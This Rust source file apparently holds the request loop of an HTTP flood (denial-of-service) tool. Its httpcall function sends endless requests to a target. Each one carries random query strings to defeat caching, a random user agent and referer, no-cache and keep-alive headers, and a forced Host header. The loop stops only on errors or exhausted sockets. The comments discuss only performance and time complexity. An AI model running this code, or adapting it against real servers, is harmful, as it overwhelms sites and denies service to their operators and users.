use rand::{seq::SliceRandom, Rng, SeedableRng};
use reqwest::{header, Client, RequestBuilder};
use std::sync::Arc;
use tokio::sync::mpsc;
use crate::types::{CallStatus, ACCEPT_CHARSET};

// Time Complexity: O(∞) potentially infinite due to loop structure
// Space Complexity: O(1) excluding the input parameters and response data
pub async fn httpcall(
    client: Arc<Client>,
    url: &str,
    host: &str,
    data: Option<&str>,
    headers: &[String],
    tx: mpsc::Sender<CallStatus>,
    headers_useragents: &[String],
    headers_referers: &[String],
    safe: bool,
) {
    // Cache this value instead of computing it in each loop iteration - O(1) time
    let param_joiner = if url.contains('?') { "&" } else { "?" };
    // Create a single RNG instance outside the loop - O(1) time and space
    let mut rng = rand::rngs::StdRng::from_entropy();
    // Pre-calculate some static headers - O(1) time and space
    let empty_ua = String::new();
    
    // The loop could run indefinitely - O(∞) worst-case time complexity
    loop {
        let request: RequestBuilder;
            
        if let Some(post_data) = data {
            // For POST requests, the URL doesn't change so we can optimize
            request = client.post(url).body(post_data.to_string());
        } else {
            // For GET requests, generate random parameters more efficiently
            // Generate random blocks with fixed sizes for better performance
            let rand_block1 = build_block(rng.gen_range(3..10));
            let rand_block2 = build_block(rng.gen_range(3..10));
            
            // Use with_capacity to reduce allocations
            let mut full_url = String::with_capacity(
                url.len() + param_joiner.len() + rand_block1.len() + rand_block2.len()
            );
            full_url.push_str(url);
            full_url.push_str(param_joiner);
            full_url.push_str(&rand_block1);
            full_url.push_str(&rand_block2);
            
            request = client.get(&full_url);
        }

        // Select random user agent and referer once
        let user_agent = headers_useragents.choose(&mut rng).unwrap_or(&empty_ua);
        
        // Build referer with pre-allocated capacity
        let empty_referer = String::new(); // Create a longer-lived empty string
        let referer_base = headers_referers.choose(&mut rng).unwrap_or(&empty_referer);
        let referer_suffix = build_block(rng.gen_range(5..10));
        let mut referer = String::with_capacity(referer_base.len() + referer_suffix.len());
        referer.push_str(referer_base);
        referer.push_str(&referer_suffix);

        // Chain all headers at once for better performance
        let keep_alive = rng.gen_range(100..110).to_string();
        let mut builder = request
            .header(header::USER_AGENT, user_agent)
            .header(header::CACHE_CONTROL, "no-cache")
            .header(header::ACCEPT_CHARSET, ACCEPT_CHARSET)
            .header(header::REFERER, referer)
            .header("Keep-Alive", keep_alive)
            .header(header::CONNECTION, "keep-alive")
            .header(header::HOST, host);

        // Add custom headers more efficiently
        for header_str in headers {
            if let Some(sep_pos) = header_str.find(':') {
                let (name, value) = header_str.split_at(sep_pos);
                builder = builder.header(name.trim(), value[1..].trim().to_string());
            }
        }

        // Send request - use a single await and match
        match builder.send().await {
            Ok(response) => {
                // Fire and forget the send operation - if it fails, we don't care
                let _ = tx.send(CallStatus::GotOk).await;
                
                if safe && response.status().is_success() {
                    let _ = tx.send(CallStatus::TargetComplete).await;
                    return;
                }
            }
            Err(e) => {
                // Check for specific error condition first before printing
                if e.to_string().contains("socket: too many open files") {
                    let _ = tx.send(CallStatus::ExitOnTooManyFiles).await;
                    return;
                }
                
                // Only print error message if we need to
                // eprintln!("{}", e);
                let _ = tx.send(CallStatus::ExitOnErr).await;
                return;
            }
        }
    }
}

// Time Complexity: O(n) where n is the size parameter
// Space Complexity: O(n) for the resulting string
fn build_block(size: usize) -> String {
    // Creating a new RNG - O(1) operation
    let mut rng = rand::rngs::StdRng::from_entropy();
    
    // Static character set - O(1) space
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    
    // Pre-allocate result with capacity size - O(n) space
    let mut result = String::with_capacity(size);
    
    // Loop runs exactly 'size' times - O(n) time complexity
    for _ in 0..size {
        // Random index generation - O(1) per iteration
        let idx = rng.gen_range(0..CHARSET.len());
        
        // Appending a character - O(1) amortized time per operation
        // (due to pre-allocation with capacity)
        result.push(CHARSET[idx] as char);
    }
    
    // Return the generated string - O(1) operation
    result
}